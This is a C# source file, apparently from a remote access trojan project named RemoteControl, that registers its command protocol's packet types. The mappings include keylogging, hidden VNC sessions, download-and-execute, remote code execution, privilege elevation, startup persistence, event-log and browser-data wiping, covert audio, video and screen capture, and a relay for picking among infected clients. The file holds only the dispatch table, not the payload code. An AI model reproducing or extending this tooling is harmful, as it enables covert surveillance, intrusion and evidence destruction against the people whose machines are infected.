using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Newtonsoft.Json;
using System.IO;
using System.Drawing.Imaging;
using System.Drawing;
using System.Reflection;
using RemoteControl.Protocals.Codec;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Protocals.Codec
{
    public class CodecFactory
    {
        private static CodecFactoryBase _coder = null;

        public static CodecFactoryBase Instance
        {
            get
            {
                if(_coder!=null)
                    return _coder;

                var mappings = GetMappings();
                _coder = new CodecFactoryBase(mappings);

                return _coder;
            }
        }
        private static Dictionary<ePacketType, Type> GetMappings()
        {
            Dictionary<ePacketType, Type> mappings = new Dictionary<ePacketType, Type>();

            mappings.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE, typeof(ResponseStartGetScreen));
            mappings.Add(ePacketType.PACKET_GET_DRIVES_RESPONSE, typeof(ResponseGetDrives));
            mappings.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, typeof(RequestGetSubFilesOrDirs));
            mappings.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE, typeof(ResponseGetSubFilesOrDirs));
            mappings.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, typeof(RequestCreateFileOrDir));
            mappings.Add(ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE, typeof(ResponseCreateFileOrDir));
            mappings.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, typeof(RequestDeleteFileOrDir));
            mappings.Add(ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE, typeof(ResponseDeleteFileOrDir));
            mappings.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, typeof(RequestStartDownload));
            mappings.Add(ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE, typeof(ResponseStartDownloadHeader));
            mappings.Add(ePacketType.PACKET_COMMAND_REQUEST, typeof(RequestCommand));
            mappings.Add(ePacketType.PACKET_COMMAND_RESPONSE, typeof(ResponseCommand));
            mappings.Add(ePacketType.PACKET_OPEN_URL_REQUEST, typeof(RequestOpenUrl));
            mappings.Add(ePacketType.PACKET_MESSAGEBOX_REQUEST, typeof(RequestMessageBox));
            mappings.Add(ePacketType.PACKET_LOCK_MOUSE_REQUEST, typeof(RequestLockMouse));
            mappings.Add(ePacketType.PACKET_PLAY_MUSIC_REQUEST, typeof(RequestPlayMusic));
            mappings.Add(ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST, typeof(RequestDownloadWebFile));
            mappings.Add(ePacketType.PACKET_GET_PROCESSES_RESPONSE, typeof(ResponseGetProcesses));
            mappings.Add(ePacketType.PACKET_KILL_PROCESS_REQUEST, typeof(RequestKillProcesses));
            mappings.Add(ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE, typeof(ResponseStartCaptureVideo));
            mappings.Add(ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST, typeof(RequestStartCaptureVideo));
            mappings.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, typeof(RequestMouseEvent));
            mappings.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, typeof(RequestKeyboardEvent));
            mappings.Add(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, typeof(RequestStartUploadHeader));
            mappings.Add(ePacketType.PACKET_START_UPLOAD_RESPONSE, typeof(ResponseStartUpload));
            mappings.Add(ePacketType.PACKET_STOP_UPLOAD_REQUEST, typeof(RequestStopUpload));
            mappings.Add(ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST, typeof(RequestCopyFile));
            mappings.Add(ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST, typeof(RequestMoveFile));
            mappings.Add(ePacketType.PACKET_COPY_FILE_OR_DIR_RESPONSE, typeof(ResponseCopyFile));
            mappings.Add(ePacketType.PACKET_MOVE_FILE_OR_DIR_RESPONSE, typeof(ResponseMoveFile));
            mappings.Add(ePacketType.PACKET_RENAME_FILE_REQUEST, typeof(RequestRenameFile));
            mappings.Add(ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST, typeof(RequestTransportExecCode));
            mappings.Add(ePacketType.PACKET_RUN_EXEC_CODE_REQUEST, typeof(RequestRunExecCode));
            mappings.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, typeof(RequestStartGetScreen));
            mappings.Add(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, typeof(ResponseGetHostName));
            mappings.Add(ePacketType.PACKET_OPEN_FILE_REQUEST, typeof(RequestOpenFile));
            mappings.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, typeof(RequestViewRegistryKey));
            mappings.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_RESPONSE, typeof(ResponseViewRegistryKey));
            mappings.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, typeof(RequestOpeRegistryValueName));
            mappings.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_RESPONSE, typeof(ResponseOpeRegistryValueName));
            mappings.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, typeof(RequestStartCaptureAudio));
            mappings.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_RESPONSE, typeof(ResponseStartCaptureAudio));
            mappings.Add(ePacketType.PACKET_GET_PROCESSES_REQUEST, typeof(RequestGetProcesses));
            mappings.Add(ePacketType.PACKET_AUTORUN_REQUEST, typeof(RequestAutoRun));
            mappings.Add(ePacketType.PACKET_AUTORUN_RESPONSE, typeof(ResponseAutoRun));
            mappings.Add(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, typeof(ResponseStartDownload));

            // 新增功能映射
            mappings.Add(ePacketType.PACKET_CLEAR_LOG_REQUEST, typeof(RequestClearLog));
            mappings.Add(ePacketType.PACKET_CLEAR_LOG_RESPONSE, typeof(ResponseClearLog));
            mappings.Add(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, typeof(RequestClearBrowserData));
            mappings.Add(ePacketType.PACKET_CLEAR_BROWSER_DATA_RESPONSE, typeof(ResponseClearBrowserData));
            mappings.Add(ePacketType.PACKET_RUN_FILE_REQUEST, typeof(RequestRunFile));
            mappings.Add(ePacketType.PACKET_RUN_FILE_RESPONSE, typeof(ResponseRunFile));
            mappings.Add(ePacketType.PACKET_COMPRESS_FILE_REQUEST, typeof(RequestCompressFile));
            mappings.Add(ePacketType.PACKET_COMPRESS_FILE_RESPONSE, typeof(ResponseCompressFile));
            mappings.Add(ePacketType.PACKET_DECOMPRESS_FILE_REQUEST, typeof(RequestDecompressFile));
            mappings.Add(ePacketType.PACKET_DECOMPRESS_FILE_RESPONSE, typeof(ResponseDecompressFile));
            mappings.Add(ePacketType.PACKET_WRITE_STARTUP_REQUEST, typeof(RequestWriteStartup));
            mappings.Add(ePacketType.PACKET_WRITE_STARTUP_RESPONSE, typeof(ResponseWriteStartup));
            mappings.Add(ePacketType.PACKET_RESTART_EXPLORER_REQUEST, typeof(RequestRestartExplorer));
            mappings.Add(ePacketType.PACKET_ELEVATE_PRIVILEGE_REQUEST, typeof(RequestElevatePrivilege));
            mappings.Add(ePacketType.PACKET_TOGGLE_PROXY_REQUEST, typeof(RequestToggleProxy));
            mappings.Add(ePacketType.PACKET_PROXY_MAPPING_REQUEST, typeof(RequestProxyMapping));
            mappings.Add(ePacketType.PACKET_KEYLOGGER_START_REQUEST, typeof(RequestKeylogger));
            mappings.Add(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, typeof(RequestKeylogger));
            mappings.Add(ePacketType.PACKET_KEYLOGGER_RESPONSE, typeof(ResponseKeylogger));
            mappings.Add(ePacketType.PACKET_SERVICE_MANAGER_REQUEST, typeof(RequestServiceManager));
            mappings.Add(ePacketType.PACKET_SERVICE_MANAGER_RESPONSE, typeof(ResponseServiceManager));
            mappings.Add(ePacketType.PACKET_DOWNLOAD_EXEC_REQUEST, typeof(RequestDownloadExec));
            mappings.Add(ePacketType.PACKET_DOWNLOAD_EXEC_RESPONSE, typeof(ResponseDownloadExec));
            mappings.Add(ePacketType.PACKET_UNINSTALL_REQUEST, typeof(RequestUninstall));
            mappings.Add(ePacketType.PACKET_GET_DRIVES_EX_RESPONSE, typeof(ResponseGetDrivesEx));
            mappings.Add(ePacketType.PACKET_REMOTE_CHAT_REQUEST, typeof(RequestRemoteChat));
            mappings.Add(ePacketType.PACKET_REMOTE_CHAT_RESPONSE, typeof(ResponseRemoteChat));
            mappings.Add(ePacketType.PACKET_FIND_WINDOW_REQUEST, typeof(RequestFindWindow));
            mappings.Add(ePacketType.PACKET_FIND_WINDOW_RESPONSE, typeof(ResponseFindWindow));
            mappings.Add(ePacketType.PACKET_CHANGE_CONFIG_REQUEST, typeof(RequestChangeConfig));
            mappings.Add(ePacketType.PACKET_CHANGE_CONFIG_RESPONSE, typeof(ResponseChangeConfig));
            mappings.Add(ePacketType.PACKET_CHANGE_RESOLUTION_REQUEST, typeof(RequestChangeResolution));
            mappings.Add(ePacketType.PACKET_CHANGE_RESOLUTION_RESPONSE, typeof(ResponseChangeResolution));
            mappings.Add(ePacketType.PACKET_HVNC_START_REQUEST, typeof(RequestHVNCStart));
            mappings.Add(ePacketType.PACKET_HVNC_START_RESPONSE, typeof(ResponseHVNCStart));
            mappings.Add(ePacketType.PACKET_HVNC_SCREEN_RESPONSE, typeof(ResponseHVNCScreen));
            mappings.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, typeof(RequestMouseEvent));
            mappings.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, typeof(RequestKeyboardEvent));
            mappings.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, typeof(RequestHVNCRunProcess));

            // Relay 中转协议映射
            mappings.Add(ePacketType.CYCLER_RELAY_HANDSHAKE, typeof(Relay.RelayHandshake));
            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_LIST_RESPONSE, typeof(Relay.RelayClientListResponse));
            mappings.Add(ePacketType.CYCLER_RELAY_SELECT_CLIENT, typeof(Relay.RelaySelectClient));
            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_ONLINE, typeof(Relay.RelayClientOnline));
            mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_OFFLINE, typeof(Relay.RelayClientOffline));

            return mappings;
        }
    }
}
